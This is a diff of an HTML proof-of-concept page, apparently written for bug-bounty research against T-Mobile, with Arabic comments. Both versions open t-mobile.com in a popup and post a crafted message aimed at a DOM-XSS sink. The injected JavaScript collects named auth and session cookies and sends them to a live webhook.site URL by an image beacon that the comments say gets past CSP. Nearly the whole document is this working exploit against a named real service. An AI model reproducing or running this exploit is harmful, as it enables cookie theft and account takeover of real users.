@@ -2,60 +2,68 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Critical Security Research PoC</title>
+    <title>Critical Security PoC - String Payload</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; background-color: #f0f0f0; }
-        .box { background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); display: inline-block; }
-        .btn { background: #ea0a8e; color: white; border: none; padding: 15px 30px; font-size: 1.2rem; border-radius: 5px; cursor: pointer; }
+        body { font-family: 'Segoe UI', sans-serif; text-align: center; padding: 50px; background-color: #1a1a1a; color: white; }
+        .box { background: #2d2d2d; padding: 40px; border-radius: 15px; border: 2px solid #ea0a8e; display: inline-block; }
+        .btn { background: #ea0a8e; color: white; border: none; padding: 15px 30px; font-size: 1.2rem; border-radius: 5px; cursor: pointer; font-weight: bold; }
+        .btn:hover { background: #ff1493; }
+        #status { color: #aaa; margin-top: 20px; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h1>Account Takeover Simulation</h1>
-    <p>Target: T-Mobile.com</p>
-    <button class="btn" onclick="launchExploit()">Execute Chain</button>
-    <p id="status">Status: Ready</p>
+    <h1>T-Mobile ATO Research</h1>
+    <p>Automated DOM-XSS & Exfiltration</p>
+    <button class="btn" onclick="launchExploit()">Execute String Attack</button>
+    <p id="status">Status: Waiting for command...</p>
 </div>
 
 <script>
     function launchExploit() {
-        document.getElementById('status').innerText = "Status: Opening Victim Window...";
+        const status = document.getElementById('status');
+        status.innerText = "Status: Opening target...";
         
-        // 1. فتح نافذة الضحية
+        // 1. فتح نافذة الهدف
         const victimWin = window.open('https://www.t-mobile.com/', '_blank');
 
         if (!victimWin) {
-            alert("Please allow pop-ups!");
+            alert("Please enable pop-ups for this exploit to work!");
             return;
         }
 
-        document.getElementById('status').innerText = "Status: Waiting for scripts to load (20s)...";
+        status.innerText = "Status: Injecting in 15 seconds (Waiting for Scripts)...";
 
-        // 2. الانتظار لضمان تحميل نظام المراقبة في نافذة الهدف
+        // 2. الانتظار حتى تحميل السكربتات (Splunk/Quantum)
         setTimeout(() => {
-            document.getElementById('status').innerText = "Status: Triggering DOM-XSS...";
+            status.innerText = "Status: Sending Malicious String Payload...";
 
-            // الكود الذي سيتم تنفيذه عند حدوث الخطأ (نفس الذي نجح معك)
-            const xssPayload = {
-                "toString": "() => { " +
-                             "const important = ['a_token', 'TFPID', 'LPVID', 'TMUT'];" +
-                             "let data = document.cookie.split('; ').filter(c => important.some(n => c.startsWith(n + '='))).join('|');" +
-                             "new Image().src = 'https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f/?leak=' + encodeURIComponent(data);" +
-                             "return 'LPExternalWindowClosed';" + // نرجّع الكلمة اللي بيحبها الـ Listener
-                             "}"
-            };
+            // صياغة الكود الذي سينفذ داخل سياق T-Mobile
+            // لاحظ أننا نستخدم "Image Beacon" لتخطي الـ CSP
+            const attackerWebhook = "https://webhook.site/3d2d99ff-5472-455e-84e4-64f5035e227f";
+            
+            const internalCode = `() => { 
+                const keys = ['a_token', 'TFPID', 'LPVID', 'TMUT'];
+                let leak = document.cookie.split('; ').filter(c => keys.some(k => c.startsWith(k + '='))).join('|');
+                new Image().src = '${attackerWebhook}/?leak=' + encodeURIComponent(leak);
+                return 'LPExternalWindowClosed';
+            }`;
 
-            // 3. إرسال الكائن كـ postMessage
-            // قمنا بإضافة خصائص إضافية لضمان مرورها من الـ Listener (الذي يبحث عن LPExternalWindowClosed)
-            victimWin.postMessage({
-                "type": "LPExternalWindowClosed", // للاستجابة للـ Listener
-                "details": xssPayload,            // هنا تقع الكارثة (الـ Sink)
-                "appName": "secureStorage"       // لزيادة فرص المعالجة من قبل السكربتات الأخرى
-            }, "*");
+            // تحويل الكائن بالكامل إلى String (JSON)
+            const payloadString = JSON.stringify({
+                "type": "LPExternalWindowClosed",
+                "details": {
+                    "toString": internalCode
+                },
+                "source": "secureStorage"
+            });
 
-            document.getElementById('status').innerText = "Status: Exploit Sent! Check Webhook.";
-        }, 30000); 
+            // 3. إرسال الـ String
+            victimWin.postMessage(payloadString, "*");
+
+            status.innerText = "Status: Payload Sent! Check your Webhook.";
+        }, 15000); 
     }
 </script>
 
